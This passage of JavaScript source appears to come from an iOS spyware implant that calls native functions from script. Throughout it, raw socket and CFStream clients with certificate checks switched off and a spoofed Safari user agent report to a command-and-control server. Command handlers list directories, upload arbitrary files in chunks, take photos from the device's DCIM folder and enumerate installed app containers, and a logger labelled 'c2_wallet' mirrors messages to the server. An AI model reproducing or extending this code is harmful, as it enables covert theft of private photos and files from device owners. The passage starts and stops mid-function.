Native.callSymbol(\"malloc\", BigInt(SZ + 1));\n\twhile (sent < str.length) {\n\t\tconst end = sent + SZ < str.length ? sent + SZ : str.length;\n\t\tconst part = str.substring(sent, end);\n\t\tNative.writeString(buf, part);\n\t\tconst n = Number(Native.callSymbol(\"write\", fd, buf, part.length));\n\t\tif (n <= 0) break;\n\t\tsent += n;\n\t}\n\tNative.callSymbol(\"free\", buf);\n}\n\nfunction _recvAll(fd) {\n\tconst SZ = 4096;\n\tconst buf = Native.callSymbol(\"malloc\", BigInt(SZ));\n\tlet result = \"\";\n\tfor (;;) {\n\t\tconst n = Number(Native.callSymbol(\"read\", fd, buf, SZ - 1));\n\t\tif (n <= 0) break;\n\t\tresult += Native.readString(buf, n);\n\t}\n\tNative.callSymbol(\"free\", buf);\n\treturn result;\n}\n\nfunction _socketPost(host, port, path, bodyStr) {\n\tconst fd = Number(Native.callSymbol(\"socket\", 2, 1, 0));\n\tif (fd <= 0) return null;\n\n\ttry {\n\t\tconst tv = Native.callSymbol(\"malloc\", 16n);\n\t\tNative.write64(tv, 15n);\n\t\tNative.write64(tv + 8n, 0n);\n\t\tNative.callSymbol(\"setsockopt\", fd, 0xFFFF, 0x1005, tv, 16);\n\t\tNative.callSymbol(\"setsockopt\", fd, 0xFFFF, 0x1006, tv, 16);\n\t\tNative.callSymbol(\"free\", tv);\n\n\t\tconst sa = Native.callSymbol(\"calloc\", 1, 16);\n\t\tconst sab = new ArrayBuffer(16);\n\t\tconst sv = new DataView(sab);\n\t\tsv.setUint8(0, 16);\n\t\tsv.setUint8(1, 2);\n\t\tsv.setUint16(2, port, false);\n\t\tconst p = host.split(\".\");\n\t\tsv.setUint8(4, parseInt(p[0]));\n\t\tsv.setUint8(5, parseInt(p[1]));\n\t\tsv.setUint8(6, parseInt(p[2]));\n\t\tsv.setUint8(7, parseInt(p[3]));\n\t\tNative.write(sa, sab);\n\n\t\tconst cr = Number(Native.callSymbol(\"connect\", fd, sa, 16));\n\t\tNative.callSymbol(\"free\", sa);\n\t\tif (cr !== 0) return null;\n\n\t\tconst hdr = \"POST \" + path + \" HTTP/1.0\\r\\nHost: \" + host + \"\\r\\nContent-Type: application/json\\r\\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1\\r\\nContent-Length: \" + bodyStr.length + \"\\r\\n\\r\\n\";\n\t\t_sendBytes(fd, hdr);\n\t\t_sendBytes(fd, bodyStr);\n\n\t\tconst resp = _recvAll(fd);\n\t\tconst idx = resp.indexOf(\"\\r\\n\\r\\n\");\n\t\tif (idx < 0) return null;\n\t\ttry { return JSON.parse(resp.substring(idx + 4)); } catch(e) { return null; }\n\t} finally {\n\t\tNative.callSymbol(\"close\", fd);\n\t}\n}\n\n// ============================================================================\n// CFStream HTTPS Client (https:// - production with Nginx/Cloudflare)\n// ============================================================================\n\nconst _RTLD_DEFAULT = 0xfffffffffffffffen;\n\nfunction _makeCFString(str) {\n\tvar buf = Native.callSymbol(\"malloc\", str.length + 1);\n\tNative.writeString(buf, str);\n\tvar cfs = Native.callSymbol(\"CFStringCreateWithCString\", 0n, buf, 0x08000100);\n\tNative.callSymbol(\"free\", buf);\n\treturn cfs;\n}\n\nfunction _getGlobalCF(name) {\n\tvar addr = Native.callSymbol(\"dlsym\", _RTLD_DEFAULT, name);\n\tif (!addr || addr === 0n) return 0n;\n\treturn Native.readPtr(BigInt(addr));\n}\n\nfunction _getGlobalCFSafe(name) {\n\tvar val = _getGlobalCF(name);\n\tif (val && val !== 0n) return val;\n\treturn _makeCFString(name);\n}\n\nfunction _cfstreamPost(host, port, path, bodyStr) {\n\tvar hostCF = _makeCFString(host);\n\tif (!hostCF || hostCF === 0n) return null;\n\n\tvar rPtr = Native.callSymbol(\"calloc\", 1, 8);\n\tvar wPtr = Native.callSymbol(\"calloc\", 1, 8);\n\n\ttry {\n\t\tNative.callSymbol(\"CFStreamCreatePairWithSocketToHost\",\n\t\t\t0n, hostCF, port, BigInt(rPtr), BigInt(wPtr));\n\n\t\tvar rs = Native.readPtr(BigInt(rPtr));\n\t\tvar ws = Native.readPtr(BigInt(wPtr));\n\n\t\tNative.callSymbol(\"CFRelease\", hostCF);\n\t\thostCF = 0n;\n\t\tNative.callSymbol(\"free\", BigInt(rPtr));\n\t\tNative.callSymbol(\"free\", BigInt(wPtr));\n\t\trPtr = 0n; wPtr = 0n;\n\n\t\tif (!rs || rs === 0n || !ws || ws === 0n) return null;\n\n\t\ttry {\n\t\t\tvar kLevel = _getGlobalCFSafe(\"kCFStreamPropertySocketSecurityLevel\");\n\t\t\tvar kNeg   = _getGlobalCFSafe(\"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n\n\t\t\tif (kLevel && kNeg) {\n\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", ws, kLevel, kNeg);\n\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\",  rs, kLevel, kNeg);\n\t\t\t}\n\n\t\t\tvar kSSL     = _getGlobalCFSafe(\"kCFStreamPropertySSLSettings\");\n\t\t\tvar kValCert = _getGlobalCFSafe(\"kCFStreamSSLValidatesCertificateChain\");\n\t\t\tvar kFalse   = _getGlobalCF(\"kCFBooleanFalse\");\n\t\t\tvar kKeyCB   = Native.callSymbol(\"dlsym\", _RTLD_DEFAULT, \"kCFTypeDictionaryKeyCallBacks\");\n\t\t\tvar kValCB   = Native.callSymbol(\"dlsym\", _RTLD_DEFAULT, \"kCFTypeDictionaryValueCallBacks\");\n\n\t\t\tif (kSSL && kValCert && kFalse && kKeyCB && kValCB) {\n\t\t\t\tvar dict = Native.callSymbol(\"CFDictionaryCreateMutable\",\n\t\t\t\t\t0n, 2, BigInt(kKeyCB), BigInt(kValCB));\n\t\t\t\tif (dict && dict !== 0n) {\n\t\t\t\t\tNative.callSymbol(\"CFDictionarySetValue\", dict, kValCert, kFalse);\n\t\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", ws, kSSL, dict);\n\t\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\",  rs, kSSL, dict);\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", dict);\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tNative.callSymbol(\"CFWriteStreamOpen\", ws);\n\t\t\tNative.callSymbol(\"CFReadStreamOpen\",  rs);\n\n\t\t\tvar ready = false;\n\t\t\tfor (var wi = 0; wi < 80; wi++) {\n\t\t\t\tvar st = Number(Native.callSymbol(\"CFWriteStreamGetStatus\", ws));\n\t\t\t\tif (st === 2) { ready = true; break; }\n\t\t\t\tif (st >= 5) break;\n\t\t\t\tNative.callSymbol(\"usleep\", 100000);\n\t\t\t}\n\t\t\tif (!ready) return null;\n\n\t\t\tvar hdr = \"POST \" + path + \" HTTP/1.0\\r\\nHost: \" + host +\n\t\t\t\t\"\\r\\nContent-Type: application/json\" +\n\t\t\t\t\"\\r\\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1\" +\n\t\t\t\t\"\\r\\nContent-Length: \" + bodyStr.length + \"\\r\\n\\r\\n\";\n\t\t\tvar fullReq = hdr + bodyStr;\n\t\t\tvar reqBuf = Native.callSymbol(\"malloc\", fullReq.length + 1);\n\t\t\tNative.writeString(reqBuf, fullReq);\n\n\t\t\tvar totalSent = 0;\n\t\t\twhile (totalSent < fullReq.length) {\n\t\t\t\tvar nw = Number(Native.callSymbol(\"CFWriteStreamWrite\",\n\t\t\t\t\tws, BigInt(reqBuf) + BigInt(totalSent),\n\t\t\t\t\tfullReq.length - totalSent));\n\t\t\t\tif (nw <= 0) break;\n\t\t\t\ttotalSent += nw;\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", BigInt(reqBuf));\n\t\t\tif (totalSent < fullReq.length) return null;\n\n\t\t\tvar respBuf = Native.callSymbol(\"malloc\", 65536);\n\t\t\tvar result = \"\";\n\t\t\tfor (var ri = 0; ri < 50; ri++) {\n\t\t\t\tvar br = Number(Native.callSymbol(\"CFReadStreamRead\",\n\t\t\t\t\trs, BigInt(respBuf), 65535));\n\t\t\t\tif (br <= 0) break;\n\t\t\t\tresult += Native.readString(BigInt(respBuf), br);\n\t\t\t}\n\t\t\tNative.callSymbol(\"free\", BigInt(respBuf));\n\n\t\t\tvar idx = result.indexOf(\"\\r\\n\\r\\n\");\n\t\t\tif (idx < 0) return null;\n\t\t\ttry { return JSON.parse(result.substring(idx + 4)); } catch(e) { return null; }\n\n\t\t} finally {\n\t\t\tNative.callSymbol(\"CFReadStreamClose\",  rs);\n\t\t\tNative.callSymbol(\"CFWriteStreamClose\", ws);\n\t\t\tNative.callSymbol(\"CFRelease\", rs);\n\t\t\tNative.callSymbol(\"CFRelease\", ws);\n\t\t}\n\t} finally {\n\t\tif (hostCF && hostCF !== 0n) Native.callSymbol(\"CFRelease\", hostCF);\n\t\tif (rPtr && rPtr !== 0n) Native.callSymbol(\"free\", BigInt(rPtr));\n\t\tif (wPtr && wPtr !== 0n) Native.callSymbol(\"free\", BigInt(wPtr));\n\t}\n}\n\nfunction _writeLog(msg) {\n\ttry {\n\t\tvar ts = new Date().toISOString();\n\t\tvar line = \"[\" + ts + \"] \" + msg + \"\\n\";\n\t\tvar fd = Number(Native.callSymbol(\"open\", \"/tmp/c2_wallet_debug.log\", 0x209, 0x1FF));\n\t\tif (fd > 0) {\n\t\t\tvar buf = Native.callSymbol(\"malloc\", line.length + 1);\n\t\t\tNative.writeString(buf, line);\n\t\t\tNative.callSymbol(\"write\", fd, buf, line.length);\n\t\t\tNative.callSymbol(\"free\", buf);\n\t\t\tNative.callSymbol(\"close\", fd);\n\t\t}\n\t} catch(e) {}\n\ttry {\n\t\tvar u = \"\";\n\t\ttry { u = DEVICE_UUID; } catch(_u) {}\n\t\thqPost(\"/log\", { uuid: u, lhu: u, text: String(msg), source: \"c2_wallet\" });\n\t} catch(_le) {}\n}\n\n// ============================================================================\n// httpPost - dual mode (https -> CFStream TLS, http -> POSIX socket)\n// ============================================================================\n\nfunction httpPost(url, body) {\n\tconst { host, port, path } = parseURL(url);\n\tconst bodyStr = JSON.stringify(body);\n\tif (url.indexOf(\"https://\") === 0) {\n\t\treturn _cfstreamPost(host, port, path, bodyStr);\n\t}\n\treturn _socketPost(host, port, path, bodyStr);\n}\n\nfunction hqPost(endpoint, body) {\n\ttry { return httpPost(HQ_API_BASE + endpoint, body); }\n\tcatch(e) { return null; }\n}\n\n// ============================================================================\n// HQ Photo Multipart Upload\n// ============================================================================\n\nfunction _writeStr(ptr, str) {\n\tvar buf = new ArrayBuffer(str.length);\n\tvar a = new Uint8Array(buf);\n\tfor (var i = 0; i < str.length; i++) a[i] = str.charCodeAt(i);\n\tNative.write(ptr, buf);\n}\n\nfunction _cfstreamSendRaw(host, port, reqBuf, reqLen) {\n\tvar hostCF = _makeCFString(host);\n\tif (!hostCF || hostCF === 0n) return false;\n\tvar rPtr = Native.callSymbol(\"calloc\", 1, 8);\n\tvar wPtr = Native.callSymbol(\"calloc\", 1, 8);\n\ttry {\n\t\tNative.callSymbol(\"CFStreamCreatePairWithSocketToHost\", 0n, hostCF, port, BigInt(rPtr), BigInt(wPtr));\n\t\tvar rs = Native.readPtr(BigInt(rPtr));\n\t\tvar ws = Native.readPtr(BigInt(wPtr));\n\t\tNative.callSymbol(\"CFRelease\", hostCF); hostCF = 0n;\n\t\tNative.callSymbol(\"free\", BigInt(rPtr)); Native.callSymbol(\"free\", BigInt(wPtr));\n\t\trPtr = 0n; wPtr = 0n;\n\t\tif (!rs || rs === 0n || !ws || ws === 0n) return false;\n\t\ttry {\n\t\t\tvar kLevel = _getGlobalCFSafe(\"kCFStreamPropertySocketSecurityLevel\");\n\t\t\tvar kNeg = _getGlobalCFSafe(\"kCFStreamSocketSecurityLevelNegotiatedSSL\");\n\t\t\tif (kLevel && kNeg) {\n\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", ws, kLevel, kNeg);\n\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", rs, kLevel, kNeg);\n\t\t\t}\n\t\t\tvar kSSL = _getGlobalCFSafe(\"kCFStreamPropertySSLSettings\");\n\t\t\tvar kValCert = _getGlobalCFSafe(\"kCFStreamSSLValidatesCertificateChain\");\n\t\t\tvar kFalse = _getGlobalCF(\"kCFBooleanFalse\");\n\t\t\tvar kKeyCB = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryKeyCallBacks\");\n\t\t\tvar kValCB = Native.callSymbol(\"dlsym\", 0xfffffffffffffffen, \"kCFTypeDictionaryValueCallBacks\");\n\t\t\tif (kSSL && kValCert && kFalse && kKeyCB && kValCB) {\n\t\t\t\tvar dict = Native.callSymbol(\"CFDictionaryCreateMutable\", 0n, 2, BigInt(kKeyCB), BigInt(kValCB));\n\t\t\t\tif (dict && dict !== 0n) {\n\t\t\t\t\tNative.callSymbol(\"CFDictionarySetValue\", dict, kValCert, kFalse);\n\t\t\t\t\tNative.callSymbol(\"CFWriteStreamSetProperty\", ws, kSSL, dict);\n\t\t\t\t\tNative.callSymbol(\"CFReadStreamSetProperty\", rs, kSSL, dict);\n\t\t\t\t\tNative.callSymbol(\"CFRelease\", dict);\n\t\t\t\t}\n\t\t\t}\n\t\t\tNative.callSymbol(\"CFWriteStreamOpen\", ws);\n\t\t\tNative.callSymbol(\"CFReadStreamOpen\", rs);\n\t\t\tvar ready = false;\n\t\t\tfor (var wi = 0; wi < 80; wi++) {\n\t\t\t\tvar st = Number(Native.callSymbol(\"CFWriteStreamGetStatus\", ws));\n\t\t\t\tif (st === 2) { ready = true; break; }\n\t\t\t\tif (st >= 5) break;\n\t\t\t\tNative.callSymbol(\"usleep\", 100000);\n\t\t\t}\n\t\t\tif (!ready) return false;\n\t\t\tvar totalSent = 0;\n\t\t\twhile (totalSent < reqLen) {\n\t\t\t\tvar nw = Number(Native.callSymbol(\"CFWriteStreamWrite\", ws, reqBuf + BigInt(totalSent), reqLen - totalSent));\n\t\t\t\tif (nw <= 0) break;\n\t\t\t\ttotalSent += nw;\n\t\t\t}\n\t\t\treturn totalSent >= reqLen;\n\t\t} finally {\n\t\t\tNative.callSymbol(\"CFReadStreamClose\", rs);\n\t\t\tNative.callSymbol(\"CFWriteStreamClose\", ws);\n\t\t\tNative.callSymbol(\"CFRelease\", rs);\n\t\t\tNative.callSymbol(\"CFRelease\", ws);\n\t\t}\n\t} finally {\n\t\tif (hostCF && hostCF !== 0n) Native.callSymbol(\"CFRelease\", hostCF);\n\t\tif (rPtr && rPtr !== 0n) Native.callSymbol(\"free\", BigInt(rPtr));\n\t\tif (wPtr && wPtr !== 0n) Native.callSymbol(\"free\", BigInt(wPtr));\n\t}\n}\n\nfunction _socketSendRaw(host, port, reqBuf, reqLen) {\n\tvar fd = Number(Native.callSymbol(\"socket\", 2, 1, 0));\n\tif (fd <= 0) return false;\n\ttry {\n\t\tvar tv = Native.callSymbol(\"malloc\", 16n);\n\t\tNative.write64(tv, 15n); Native.write64(tv + 8n, 0n);\n\t\tNative.callSymbol(\"setsockopt\", fd, 0xFFFF, 0x1005, tv, 16);\n\t\tNative.callSymbol(\"setsockopt\", fd, 0xFFFF, 0x1006, tv, 16);\n\t\tNative.callSymbol(\"free\", tv);\n\t\tvar sa = Native.callSymbol(\"calloc\", 1, 16);\n\t\tvar sab = new ArrayBuffer(16);\n\t\tvar sv = new DataView(sab);\n\t\tsv.setUint8(0, 16); sv.setUint8(1, 2);\n\t\tsv.setUint16(2, port, false);\n\t\tvar pp = host.split(\".\");\n\t\tsv.setUint8(4, parseInt(pp[0])); sv.setUint8(5, parseInt(pp[1]));\n\t\tsv.setUint8(6, parseInt(pp[2])); sv.setUint8(7, parseInt(pp[3]));\n\t\tNative.write(sa, sab);\n\t\tvar cr = Number(Native.callSymbol(\"connect\", fd, sa, 16));\n\t\tNative.callSymbol(\"free\", sa);\n\t\tif (cr !== 0) return false;\n\t\tvar totalSent = 0;\n\t\twhile (totalSent < reqLen) {\n\t\t\tvar nw = Number(Native.callSymbol(\"write\", fd, reqBuf + BigInt(totalSent), reqLen - totalSent));\n\t\t\tif (nw <= 0) break;\n\t\t\ttotalSent += nw;\n\t\t}\n\t\treturn totalSent >= reqLen;\n\t} finally { Native.callSymbol(\"close\", fd); }\n}\n\nfunction _hqUploadPhoto(filePath, filename, uuid, seq, md5hash) {\n\treturn false;\n\tvar useTLS = HQ_API_BASE.indexOf(\"https://\") === 0;\n\tvar p = parseURL(HQ_API_BASE + \"/p\");\n\tvar fileFd = Number(Native.callSymbol(\"open\", filePath, 0, 0));\n\tif (fileFd < 0) return false;\n\tvar fileLen = Number(Native.callSymbol(\"lseek\", fileFd, 0, 2));\n\tNative.callSymbol(\"lseek\", fileFd, 0, 0);\n\tif (fileLen <= 0 || fileLen > 5242880) {\n\t\tNative.callSymbol(\"close\", fileFd);\n\t\treturn false;\n\t}\n\tvar fileBuf = Native.callSymbol(\"malloc\", BigInt(fileLen));\n\tif (!fileBuf || fileBuf === 0n) { Native.callSymbol(\"close\", fileFd); return false; }\n\tNative.callSymbol(\"read\", fileFd, fileBuf, fileLen);\n\tNative.callSymbol(\"close\", fileFd);\n\n\tvar bnd = \"------HqBound\";\n\tvar ua = \"Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Mobile/15E148 Safari/604.1\";\n\tvar prefix =\n\t\t\"--\" + bnd + \"\\r\\nContent-Disposition: form-data; name=\\\"uuid\\\"\\r\\n\\r\\n\" + uuid + \"\\r\\n\" +\n\t\t\"--\" + bnd + \"\\r\\nContent-Disposition: form-data; name=\\\"filename\\\"\\r\\n\\r\\n\" + filename + \"\\r\\n\" +\n\t\t\"--\" + bnd + \"\\r\\nContent-Disposition: form-data; name=\\\"seq\\\"\\r\\n\\r\\n\" + seq + \"\\r\\n\" +\n\t\t\"--\" + bnd + \"\\r\\nContent-Disposition: form-data; name=\\\"md5\\\"\\r\\n\\r\\n\" + md5hash + \"\\r\\n\" +\n\t\t\"--\" + bnd + \"\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"\" + filename + \"\\\"\\r\\nContent-Type: application/octet-stream\\r\\n\\r\\n\";\n\tvar suffix = \"\\r\\n--\" + bnd + \"--\\r\\n\";\n\tvar bodyLen = prefix.length + fileLen + suffix.length;\n\tvar hdr = \"POST /p HTTP/1.0\\r\\nHost: \" + p.host + \"\\r\\nContent-Type: multipart/form-data; boundary=\" + bnd + \"\\r\\nUser-Agent: \" + ua + \"\\r\\nContent-Length: \" + bodyLen + \"\\r\\n\\r\\n\";\n\n\tvar totalLen = hdr.length + bodyLen;\n\tvar reqBuf = Native.callSymbol(\"malloc\", BigInt(totalLen));\n\tif (!reqBuf || reqBuf === 0n) { Native.callSymbol(\"free\", fileBuf); return false; }\n\n\t_writeStr(reqBuf, hdr);\n\t_writeStr(reqBuf + BigInt(hdr.length), prefix);\n\tNative.callSymbol(\"memcpy\", reqBuf + BigInt(hdr.length + prefix.length), fileBuf, BigInt(fileLen));\n\tNative.callSymbol(\"free\", fileBuf);\n\t_writeStr(reqBuf + BigInt(hdr.length + prefix.length + fileLen), suffix);\n\n\tvar ok = useTLS\n\t\t? _cfstreamSendRaw(p.host, p.port, reqBuf, totalLen)\n\t\t: _socketSendRaw(p.host, p.port, reqBuf, totalLen);\n\tNative.callSymbol(\"free\", reqBuf);\n\treturn ok;\n}\n\n// ============================================================================\n// File & Directory Helpers\n// ============================================================================\n\nfunction readFileB64(path, maxSize) {\n\tmaxSize = maxSize || MAX_FILE_SIZE;\n\tconst fd = Number(Native.callSymbol(\"open\", path, 0, 0));\n\tif (fd < 0) return null;\n\ttry {\n\t\tconst sz = Number(Native.callSymbol(\"lseek\", fd, 0, 2));\n\t\tNative.callSymbol(\"lseek\", fd, 0, 0);\n\t\tif (sz <= 0 || sz > maxSize) return null;\n\t\tconst buf = Native.callSymbol(\"malloc\", BigInt(sz));\n\t\tif (!buf || buf === 0n) return null;\n\t\ttry {\n\t\t\tconst nr = Number(Native.callSymbol(\"read\", fd, buf, sz));\n\t\t\tif (nr <= 0) return null;\n\t\t\treturn { b64: bytesToBase64(new Uint8Array(Native.read(buf, nr))), size: nr };\n\t\t} finally { Native.callSymbol(\"free\", buf); }\n\t} finally { Native.callSymbol(\"close\", fd); }\n}\n\nfunction getFileSize(path) {\n\tvar fd = Number(Native.callSymbol(\"open\", path, 0, 0));\n\tif (fd < 0) return -1;\n\tvar sz = Number(Native.callSymbol(\"lseek\", fd, 0, 2));\n\tNative.callSymbol(\"close\", fd);\n\treturn sz;\n}\n\nfunction sendFileChunked(cmdId, path, filename, category, meta) {\n\tvar fd = Number(Native.callSymbol(\"open\", path, 0, 0));\n\tif (fd < 0) return { ok: false, error: \"open failed\", sent: 0, total: 0 };\n\ttry {\n\t\treturn _sendChunksFromFd(cmdId, fd, -1, filename, category, meta);\n\t} finally { Native.callSymbol(\"close\", fd); }\n}\n\nfunction _sendChunksFromFd(cmdId, fd, knownSize, filename, category, meta) {\n\tvar fileSize = knownSize > 0 ? knownSize : Number(Native.callSymbol(\"lseek\", fd, 0, 2));\n\tif (knownSize <= 0) Native.callSymbol(\"lseek\", fd, 0, 0);\n\tif (fileSize <= 0) return { ok: false, error: \"empty file\", sent: 0, total: 0 };\n\n\tvar totalChunks = Math.ceil(fileSize / CHUNK_SIZE);\n\tvar buf = Native.callSymbol(\"malloc\", BigInt(CHUNK_SIZE));\n\tif (!buf || buf === 0n) return { ok: false, error: \"malloc failed\", sent: 0, total: totalChunks };\n\tvar sentOk = 0, lastErr = \"\";\n\ttry {\n\t\tfor (var ci = 0; ci < totalChunks; ci++) {\n\t\t\tvar toRead = Math.min(CHUNK_SIZE, fileSize - ci * CHUNK_SIZE);\n\t\t\tvar nr = Number(Native.callSymbol(\"read\", fd, buf, toRead));\n\t\t\tif (nr <= 0) { lastErr = \"read returned \" + nr; break; }\n\t\t\tvar b64 = bytesToBase64(new Uint8Array(Native.read(buf, nr)));\n\t\t\tvar body = {\n\t\t\t\tcommand_id: cmdId, uuid: DEVICE_UUID,\n\t\t\t\tfilename: filename, data: b64,\n\t\t\t\tchunk_index: ci, total_chunks: totalChunks,\n\t\t\t\tcategory: category || \"\"\n\t\t\t};\n\t\t\tif (meta && ci === totalChunks - 1) {\n\t\t\t\tbody._exec_start_ms = meta.start_ms || 0;\n\t\t\t\tbody._exec_end_ms = meta.end_ms || 0;\n\t\t\t}\n\t\t\tvar postOk = false;\n\t\t\tfor (var retry = 0; retry < 3; retry++) {\n\t\t\t\ttry {\n\t\t\t\t\tvar r = httpPost(C2_RESULT_URL, body);\n\t\t\t\t\tif (r !== null) { postOk = true; break; }\n\t\t\t\t} catch(pe) {}\n\t\t\t\tNative.callSymbol(\"usleep\", 2000000);\n\t\t\t}\n\t\t\tif (postOk) { sentOk++; }\n\t\t\telse { lastErr = \"POST failed chunk \" + ci; break; }\n\t\t}\n\t} finally { Native.callSymbol(\"free\", buf); }\n\treturn { ok: sentOk === totalChunks, error: lastErr, sent: sentOk,\n\t\t\t total: totalChunks, fileSize: fileSize };\n}\n\nfunction listDir(path) {\n\tconst d = Native.callSymbol(\"opendir\", path);\n\tif (!d || d === 0n) return [];\n\tconst out = [];\n\tfor (;;) {\n\t\tconst ent = Native.callSymbol(\"readdir\", d);\n\t\tif (!ent || ent === 0n) break;\n\t\t// Darwin dirent: d_ino(8)+d_seekoff(8)+d_reclen(2)+d_namlen(2)+d_type(1)+d_name\n\t\tconst dtype = new Uint8Array(Native.read(ent + 20n, 1))[0];\n\t\tconst name = Native.readString(ent + 21n, 256);\n\t\tif (name === \".\" || name === \"..\") continue;\n\t\tout.push({ name: name, type: dtype === 4 ? \"dir\" : dtype === 8 ? \"file\" : \"\"+dtype });\n\t}\n\tNative.callSymbol(\"closedir\", d);\n\treturn out;\n}\n\n// ============================================================================\n// Command Handlers\n// ============================================================================\n\nfunction sendResult(cmdId, data, filename, category, meta) {\n\tconst body = { command_id: cmdId, uuid: DEVICE_UUID, filename: filename || \"result.bin\" };\n\tif (data) body.data = data;\n\tif (category) body.category = category;\n\tif (meta) {\n\t\tif (meta.start_ms) body._exec_start_ms = meta.start_ms;\n\t\tif (meta.end_ms)   body._exec_end_ms   = meta.end_ms;\n\t}\n\tfor (var _retry = 0; _retry < 3; _retry++) {\n\t\tvar _resp = httpPost(C2_RESULT_URL, body);\n\t\tif (_resp !== null) return;\n\t\tNative.callSymbol(\"usleep\", 2000000);\n\t}\n}\n\nfunction sendJSON(cmdId, obj, filename, meta) {\n\tconst s = JSON.stringify(obj);\n\tsendResult(cmdId, bytesToBase64(new Uint8Array(Native.stringToBytes(s, false))), filename || \"result.json\", null, meta);\n}\n\nfunction handleLs(cmd) {\n\tconst p = (cmd.params && cmd.params.path) || \"/\";\n\tsendJSON(cmd.command_id, listDir(p), \"ls_\" + p.replace(/\\//g, \"_\") + \".json\");\n}\n\nfunction handleDownload(cmd) {\n\tvar p = cmd.params && cmd.params.path;\n\tif (!p) return;\n\tvar maxSz = (cmd.params && cmd.params.max_size) || MAX_FILE_SIZE;\n\tvar sz = getFileSize(p);\n\tif (sz <= 0 || sz > maxSz) return;\n\tvar fname = p.split(\"/\").pop();\n\tif (sz <= CHUNK_SIZE) {\n\t\tvar f = readFileB64(p, maxSz);\n\t\tif (f) sendResult(cmd.command_id, f.b64, fname);\n\t} else {\n\t\tsendFileChunked(cmd.command_id, p, fname);\n\t}\n}\n\nfunction handlePhotos(cmd) {\n\tvar dcim = \"/var/mobile/Media/DCIM\";\n\tvar maxCount = (cmd.params && cmd.params.max_count) || 50;\n\tvar count = 0;\n\tvar dirs = listDir(dcim);\n\tfor (var di = 0; di < dirs.length && count < maxCount; di++) {\n\t\tif (dirs[di].type !== \"dir\") continue;\n\t\tvar sub = dcim + \"/\" + dirs[di].name;\n\t\tvar files = listDir(sub);\n\t\tfor (var fi = 0; fi < files.length && count < maxCount; fi++) {\n\t\t\tif (files[fi].type !== \"file\") continue;\n\t\t\tvar fp = sub + \"/\" + files[fi].name;\n\t\t\tvar sz = getFileSize(fp);\n\t\t\tif (sz <= 0) continue;\n\t\t\tif (sz <= CHUNK_SIZE) {\n\t\t\t\tvar f = readFileB64(fp);\n\t\t\t\tif (f) {\n\t\t\t\t\tsendResult(cmd.command_id, f.b64, files[fi].name, \"photos\");\n\t\t\t\t\tcount++;\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tvar chunkResult = sendFileChunked(cmd.command_id, fp, files[fi].name, \"photos\");\n\t\t\t\tif (chunkResult && chunkResult.ok) count++;\n\t\t\t}\n\t\t}\n\t}\n\tsendJSON(cmd.command_id, { collected: count }, \"photos_summary.json\");\n}\n\nfunction _extractBundleId(bytes) {\n\tvar text = _rawToStr(bytes);\n\tvar xmlKey = \"MCMMetadataIdentifier</key>\";\n\tvar ki = text.indexOf(xmlKey);\n\tif (ki >= 0) {\n\t\tvar si = text.indexOf(\"<string>\", ki);\n\t\tif (si >= 0) {\n\t\t\tsi += 8;\n\t\t\tvar ei = text.indexOf(\"</string>\", si);\n\t\t\tif (ei >= 0) return text.substring(si, ei);\n\t\t}\n\t}\n\tvar strings = [];\n\tvar cur = \"\";\n\tfor (var i = 0; i < bytes.length; i++) {\n\t\tif (bytes[i] >= 0x20 && bytes[i] <= 0x7E) {\n\t\t\tcur += String.fromCharCode(bytes[i]);\n\t\t} else {\n\t\t\tif (cur.length >= 3) strings.push(cur);\n\t\t\tcur = \"\";\n\t\t}\n\t}\n\tif (cur.length >= 3) strings.push(cur);\n\tvar mki = -1;\n\tfor (var j = 0; j < strings.length; j++) {\n\t\tif (strings[j] === \"MCMMetadataIdentifier\") { mki = j; break; }\n\t}\n\tvar candidates = [];\n\tfor (var j = 0; j < strings.length; j++) {\n\t\tvar s = strings[j];\n\t\tvar fi = 0;\n\t\twhile (fi < s.length && !((s.charCodeAt(fi) >= 0x41 && s.charCodeAt(fi) <= 0x5A) ||\n\t\t\t(s.charCodeAt(fi) >= 0x61 && s.charCodeAt(fi) <= 0x7A))) fi++;\n\t\tif (fi > 0) s = s.substring(fi);\n\t\tif (s.length < 5) continue;\n\t\tif (s.indexOf(\".\") < 0) continue;\n\t\tif (s.indexOf(\"MCM\") === 0) continue;\n\t\tif (s.charAt(0) === \"$\") continue;\n\t\tif (s.indexOf(\"]\") >= 0) continue;\n\t\tif (s.indexOf(\"bplist\") >= 0) continue;\n\t\tif (s.indexOf(\"apple.mobile_container\") >= 0) continue;\n\t\tif (s.indexOf(\"MobileInstallation\") >= 0) continue;\n\t\tif (s === \"com.apple.installd\") continue;\n\t\tif (s === \"com.apple.containermanagerd\") continue;\n\t\tif (s === \"com.apple.lsd\") continue;\n\t\tcandidates.push({ s: s, i: j });\n\t}\n\tif (candidates.length === 0) return \"\";\n\tif (candidates.length === 1) return candidates[0].s;\n\tif (mki >= 0) {\n\t\tvar best = candidates[0];\n\t\tvar bd = Math.abs(candidates[0].i - mki);\n\t\tfor (var k = 1; k < candidates.length; k++) {\n\t\t\tvar d = Math.abs(candidates[k].i - mki);\n\t\t\tif (d < bd) { bd = d; best = candidates[k]; }\n\t\t}\n\t\treturn best.s;\n\t}\n\treturn candidates[0].s;\n}\n\nfunction handleApps(cmd) {\n\tconst base = \"/var/mobile/Containers/Data/Application\";\n\tconst dirs = listDir(base);\n\tconst apps = [];\n\tfor (let i = 0; i < dirs.length; i++) {\n\t\tif 